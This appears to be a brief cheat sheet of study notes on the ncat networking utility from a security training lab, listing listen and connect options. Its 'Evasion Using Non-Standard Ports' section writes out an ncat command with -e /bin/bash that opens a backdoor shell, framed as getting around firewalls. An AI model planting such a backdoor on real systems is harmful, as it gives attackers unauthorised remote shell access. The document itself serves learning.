Ncat - networking utility which reads and writes data across networks
Source: https://nmap.org/ncat/

Usage:
  nc -lvnp PORT_NUM        To listen using TCP where port number is the port you want to listen to
                           If the port number is less than `1024`, you need to run `nc` as root
  nc TARGET_IP PORT_NUM    To connect to an Ncat instance listening on a TCP port
  -c or --sh-exec          Executes the given command via /bin/sh
  ncat TARGET_SERVER 25    Connects to the target server at port 25

Options:
  -l   Tells ncat to listen for incoming connections
  -v   Gets more verbose output as ncat binds to a source port and receives a connection
  -n   Avoids resolving hostnames
  -p   Specifies the port number that ncat will listen on
  -u   Listen using UDP

Evasion Using Non-Standard Ports:
  ncat -lvnp PORT_NUMBER -e /bin/bash
                    Creates a backdoor via the specified port number that lets you interact with the Bash shell
  ncat MACHINE_IP PORT_NUMBER
                    On the AttackBox, we can run ncat to connect to the target machine and interact with its shell
                    Considering the case that we have a firewall, it is not enough to use `ncat` to create a backdoor
                    unless we can connect to the listening port number. Moreover, unless we run `ncat` as a
                    privileged user, `root`, or using `sudo`, we cannot use port numbers below `1024`

Options:
  -e, --exec  Executes the given command
  /bin/bash   Location of the command we want to execute
